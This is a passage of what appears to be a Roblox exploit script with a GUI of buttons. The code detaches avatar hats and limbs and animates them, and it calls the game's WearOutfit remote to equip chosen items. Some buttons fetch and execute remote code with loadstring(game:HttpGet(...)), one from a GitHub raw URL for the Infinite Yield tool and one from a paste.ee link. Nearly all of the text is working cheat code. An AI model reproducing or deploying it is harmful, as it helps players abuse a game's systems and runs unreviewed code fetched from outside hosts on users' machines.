	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr['Right Arm']);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr['Right Arm'].Orientation.X + XvalO.Value, chr['Right Arm'].Orientation.Y + YvalO.Value, chr['Right Arm'].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function laBlock()
-- Main Animation
-- Hat Position
local p = game.Players.LocalPlayer.Character["Big Block"]
p.Name = "11"
local HAT = "11"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr['Left Arm']);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr['Left Arm'].Orientation.X + XvalO.Value, chr['Left Arm'].Orientation.Y + YvalO.Value, chr['Left Arm'].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function rlBlock()
-- Main Animation
-- Hat Position
local p = game.Players.LocalPlayer.Character["Big Block"]
p.Name = "111"
local HAT = "111"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr['Right Leg']);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr['Right Leg'].Orientation.X + XvalO.Value, chr['Right Leg'].Orientation.Y + YvalO.Value, chr['Right Leg'].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function llBlock()
-- Main Animation
-- Hat Position
local p = game.Players.LocalPlayer.Character["Big Block"]
p.Name = "1111"
local HAT = "1111"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr['Left Leg']);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr['Left Leg'].Orientation.X + XvalO.Value, chr['Left Leg'].Orientation.Y + YvalO.Value, chr['Left Leg'].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function torBlock()
-- Main Animation
-- Hat Position
local p = game.Players.LocalPlayer.Character["Big Block"]
p.Name = "11111"
local HAT = "11111"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr['Torso']);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr['Torso'].Orientation.X + XvalO.Value, chr['Torso'].Orientation.Y + YvalO.Value, chr['Torso'].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

raBlock()
laBlock()
rlBlock()
llBlock()
torBlock()
end)

Script_14.Name = "Script"
Script_14.Parent = HatScripts
Script_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_14.Position = UDim2.new(0, 0, 9, 0)
Script_14.Size = UDim2.new(0, 52, 0, 19)
Script_14.Visible = false
Script_14.TextScaled = true
Script_14.Font = Enum.Font.SourceSans
Script_14.Text = "Inf Yield"
Script_14.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_14.TextSize = 14.000
Script_14.MouseButton1Click:connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

local player = game.Players.LocalPlayer
for i,hat in pairs(player.Character:GetChildren()) do
if hat:IsA("Accessory") then

end
end

local part = Instance.new("Part",workspace)
part.Anchored = true
part.CanCollide = false
part.Transparency = 1
part.Size = Vector3.new(1,1,1)

e = Vector3.new(0,0,0)
f = Vector3.new(0,0,0)
spintoggle = true

local function spieen()
    if spintoggle == true then
    spintoggle = false
   e = e + Vector3.new(-1,1,10)
   spintoggle = true
   end
end

local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "191101707"
local args = {
    Face = "";
    
    Hat1 = code;
    Hat2 = code;

    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}


habies:InvokeServer(args)

game['Run Service'].RenderStepped:Connect(function()
    part.Position = game.Players.LocalPlayer.Character.Torso.Position
    part.Orientation = game.Players.LocalPlayer.Character.Torso.Orientation + e
    spieen()
end)
-- Main Animation
-- Hat Position
local function RightArm()
local Limb = "Right Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 2
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 90

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end



local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

-- Main Animation
-- Hat Position
local function LeftArm()
local Limb = "Left Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -2
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = -90

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function fire1()
-- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character['FireMohawk']
j.Name = "fire1"
local HAT = "fire1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -1.5
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr['Right Arm']);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr['Right Arm'].Orientation.X + XvalO.Value, chr['Right Arm'].Orientation.Y + YvalO.Value, chr['Right Arm'].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function fire2()
-- Main Animation
-- Hat Position
local j = game.Players.LocalPlayer.Character['FireMohawk']
j.Name = "fire2"
local HAT = "fire2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -1.4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr['Left Arm']);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr['Left Arm'].Orientation.X + XvalO.Value, chr['Left Arm'].Orientation.Y + YvalO.Value, chr['Left Arm'].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

RightArm()
LeftArm()
fire1()
fire2()
end)

Script_15.Name = "Script"
Script_15.Parent = HatScripts
Script_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_15.Position = UDim2.new(2.63461542, 0, 9, 0)
Script_15.Size = UDim2.new(0, 52, 0, 19)
Script_15.Visible = false
Script_15.Font = Enum.Font.SourceSans
Script_15.Text = "Suicide Gun"
Script_15.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_15.TextSize = 12.000
Script_15.MouseButton1Click:connect(function()
local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit
loadstring(game:HttpGet('https://paste.ee/r/HRAcR'))()  
local code = nil
local args = {
    Face = "";
    
    Hat1 = "4875935116";

    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}

habies:InvokeServer(args)
strength = 30

local plr = game.Players.LocalPlayer
local chr = plr.Character
local hum = chr.Humanoid
local mouse = plr:GetMouse()
local gun = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
gun.Name = "Gun"
gun.Parent = game.Players.LocalPlayer.Character

local walking = Instance.new("BoolValue", plr.Character)
local idle = Instance.new("BoolValue", plr.Character)

walking.Name = "walking"
idle.Name = "idle"




e = true

game["Run Service"].RenderStepped:connect(function()
    game.Players.LocalPlayer.Character["Right Arm"].CanCollide = false
    game.Players.LocalPlayer.Character["Right Arm"].CanCollide = false
end)

mouse.Button1Down:connect(function()
 if gun.Parent == game.Players.LocalPlayer.Character then
local plr = game.Players.LocalPlayer
--plr.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0,4,0)
wait()
plr.Character:FindFirstChild("Akina Sweeper"):Destroy()
local removeHRP = true
game.Players.LocalPlayer.Character["Right Arm"]:BreakJoints()
plrmodel = plr.Character or plr.CharacterAdded:wait()
humanoid = plrmodel.Humanoid
local Welds = {}
function getwelds()
for index, child in pairs(plrmodel:GetDescendants()) do
if child.ClassName == "Motor6D" then
if child.Name ~= "Neck" then
table.insert(Welds, {w = child, p = child.Parent})
end
end
end
end
getwelds()
local Enabled = false
game:GetService("RunService").Heartbeat:connect(function()
if Enabled == true and humanoid ~= nil then
humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
end
end)
local head = plrmodel["Head"]
local leftarm = plrmodel["Left Arm"]
local leftleg = plrmodel["Left Leg"]
local rightleg = plrmodel["Right Leg"]
local rightarm = plrmodel["Right Arm"]
local torso = plrmodel.Torso
local root = plrmodel.HumanoidRootPart
local attachments = {}
local constraints = {}
function createRagdoll()
for i,v in pairs(Welds) do
v.w.Parent = nil
end
if removeHRP == true then
root.Parent = nil
end
local It = Instance.new
local Instance = {new = function(...) local New = It(...) if New.ClassName:lower() == "attachment" or New.ClassName:lower() == "hingeconstraint" or New.ClassName:lower() == "ballsocketconstraint" then table.insert(attachments, New) end return New end}
local rootA =Instance.new("Attachment")
local HeadA = Instance.new("Attachment")
local LeftArmA = Instance.new("Attachment")
local LeftLegA = Instance.new("Attachment")
local RightArmA = Instance.new("Attachment")
local RightLegA = Instance.new("Attachment")
local TorsoA = Instance.new("Attachment")
local TorsoA1 = Instance.new("Attachment")
local TorsoA2 = Instance.new("Attachment")
local TorsoA3 = Instance.new("Attachment")
local TorsoA4 = Instance.new("Attachment")
local TorsoA5 = Instance.new("Attachment")
local function set1()
HeadA.Name = "HeadA"
HeadA.Parent = head
HeadA.Position = Vector3.new(0, -0.5, 0)
HeadA.Rotation = Vector3.new(0, 0, 0)
HeadA.Axis = Vector3.new(1, 0, 0)
HeadA.SecondaryAxis = Vector3.new(0, 1, 0)
LeftArmA.Name = "LeftArmA"
LeftArmA.Parent = leftarm
LeftArmA.Position = Vector3.new(0.5, 1, 0)
LeftArmA.Rotation = Vector3.new(0, 0, 0)
LeftArmA.Axis = Vector3.new(1, 0, 0)
LeftArmA.SecondaryAxis = Vector3.new(0, 1, 0)
LeftLegA.Name = "LeftLegA"
LeftLegA.Parent = leftleg
LeftLegA.Position = Vector3.new(0, 1, 0)
LeftLegA.Rotation = Vector3.new(0, 0, 0)
LeftLegA.Axis = Vector3.new(1, 0, 0)
LeftLegA.SecondaryAxis = Vector3.new(0, 1, 0)
RightArmA.Name = "RightArmA"
RightArmA.Parent = rightarm
RightArmA.Position = Vector3.new(-0.5, 1, 0)
RightArmA.Rotation = Vector3.new(0, 0, 0)
RightArmA.Axis = Vector3.new(1, 0, 0)
RightArmA.SecondaryAxis = Vector3.new(0, 1, 0)
RightLegA.Name = "RightLegA"
RightLegA.Parent = rightleg
RightLegA.Position = Vector3.new(0, 1, 0)
RightLegA.Rotation = Vector3.new(0, 0, 0)
RightLegA.Axis = Vector3.new(1, 0, 0)
RightLegA.SecondaryAxis = Vector3.new(0, 1, 0)
rootA.Name= "rootA"
rootA.Parent = root
rootA.Position = Vector3.new(0, 0, 0)
rootA.Rotation = Vector3.new(0, 90, 0)
rootA.Axis = Vector3.new(0, 0, -1)
rootA.SecondaryAxis = Vector3.new(0, 1, 0)
end
local function set2()
TorsoA.Name = "TorsoA"
TorsoA.Parent = torso
TorsoA.Position = Vector3.new(0.5, -1, 0)
TorsoA.Rotation = Vector3.new(0, 0, 0)
TorsoA.Axis = Vector3.new(1, 0, 0)
TorsoA.SecondaryAxis = Vector3.new(0, 1, 0)
TorsoA1.Name = "TorsoA1"
TorsoA1.Parent = torso
TorsoA1.Position = Vector3.new(-0.5, -1, 0)
TorsoA1.Rotation = Vector3.new(0, 0, 0)
TorsoA1.Axis = Vector3.new(1, 0, 0)
TorsoA1.SecondaryAxis = Vector3.new(0, 1, 0)
TorsoA2.Name = "TorsoA2"
TorsoA2.Parent = torso
TorsoA2.Position = Vector3.new(-1, 1, 0)
TorsoA2.Rotation = Vector3.new(0, 0, 0)
TorsoA2.Axis = Vector3.new(1, 0, 0)
TorsoA2.SecondaryAxis = Vector3.new(0, 1, 0)
TorsoA3.Name = "TorsoA3"
TorsoA3.Parent = torso
TorsoA3.Position = Vector3.new(1, 1, 0)
TorsoA3.Rotation = Vector3.new(0, 0, 0)
TorsoA3.Axis = Vector3.new(1, 0, 0)
TorsoA3.SecondaryAxis = Vector3.new(0, 1, 0)
TorsoA4.Name = "TorsoA4"
TorsoA4.Parent = torso
TorsoA4.Position = Vector3.new(0, 1, 0)
TorsoA4.Rotation = Vector3.new(0, 0, 0)
TorsoA4.Axis = Vector3.new(1, 0, 0)
TorsoA4.SecondaryAxis = Vector3.new(0, 1, 0)
TorsoA5.Name = "TorsoA5"
TorsoA5.Parent = torso
TorsoA5.Position = Vector3.new(0, 0, 0)
TorsoA5.Rotation = Vector3.new(0, 90, 0)
TorsoA5.Axis = Vector3.new(0, 0, -1)
TorsoA5.SecondaryAxis = Vector3.new(0, 1, 0)
end
spawn(set1);
spawn(set2);
local HA = Instance.new("HingeConstraint")
HA.Parent = head
HA.Attachment0 = HeadA
HA.Attachment1 = TorsoA4
HA.Enabled = true
HA.LimitsEnabled=true
HA.LowerAngle=0
HA.UpperAngle=0
local LAT = Instance.new("BallSocketConstraint")
LAT.Parent = leftarm
LAT.Attachment0 = LeftArmA
LAT.Attachment1 = TorsoA2
LAT.Enabled = true
LAT.LimitsEnabled=true
LAT.UpperAngle=90
local RAT = Instance.new("BallSocketConstraint")
RAT.Parent = rightarm
RAT.Attachment0 = RightArmA
RAT.Attachment1 = TorsoA3
RAT.Enabled = true
RAT.LimitsEnabled=true
RAT.UpperAngle=90
local HA = Instance.new("BallSocketConstraint")
HA.Parent = head
HA.Attachment0 = HeadA
HA.Attachment1 = TorsoA4
HA.Enabled = true
local TLL = Instance.new("BallSocketConstraint")
TLL.Parent = torso
TLL.Attachment0 = TorsoA1
TLL.Attachment1 = LeftLegA
TLL.Enabled = true
TLL.LimitsEnabled=true
TLL.UpperAngle=90
local TRL = Instance.new("BallSocketConstraint")
TRL.Parent = torso
TRL.Attachment0 = TorsoA
TRL.Attachment1 = RightLegA
TRL.Enabled = true
TRL.LimitsEnabled=true
TRL.UpperAngle=90
local RTA = Instance.new("BallSocketConstraint")
RTA.Parent = root
RTA.Attachment0 = rootA
RTA.Attachment1 = TorsoA5
RTA.Enabled = true
RTA.LimitsEnabled=true
RTA.UpperAngle=0
head.Velocity = head.CFrame.lookVector*30
Enabled = true
end
function disableRagdoll()
for i,v in pairs(Welds) do
v.w.Parent = v.p
end
if removeHRP == true then
torso.Anchored=true
root.Parent = plrmodel
torso.Anchored = false
end
humanoid.Jump = true
for i,v in pairs(attachments) do
v:Destroy()
end
for i,v in pairs(constraints) do
v:Destroy()
end
Enabled = false
end

local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character["Right Arm"]
bambam.Force = Vector3.new(0,-strength,0)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 
wait(.3)
createRagdoll()
chr:BreakJoints()
wait()
wait(.2)
bambam:Destroy()
end
end)


responsiveness = 30
originalresponsiveness = responsiveness
RarmPosX = 3
RarmPosY = 1
RarmPosZ = 0

RarmOriX = 90
RarmOriY = 90
RarmOriZ = 0

LarmPosX = -1.5
LarmPosY = 0
LarmPosZ = 0

LarmOriX = 0
LarmOriY = 0
LarmOriZ = 0

Weapon1PosX = 0
Weapon1PosY = -1.3
Weapon1PosZ = -.3

Weapon1OriX = 90
Weapon1OriY = 90
Weapon1OriZ = -225

local function hat1()
e = math.random(-10000000,10000000)
local HAT = "Akina Sweeper"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = Weapon1PosX
Yval.Value = Weapon1PosY
Zval.Value = Weapon1PosZ

XvalO.Value = Weapon1OriX
YvalO.Value = Weapon1OriY
ZvalO.Value = Weapon1OriZ

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = math.huge
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["Right Arm"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

movetog = true
local function move()
    if movetog == true then
       mootog = false
       
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	if mode == 1 then
		for _, v in pairs(mov) do
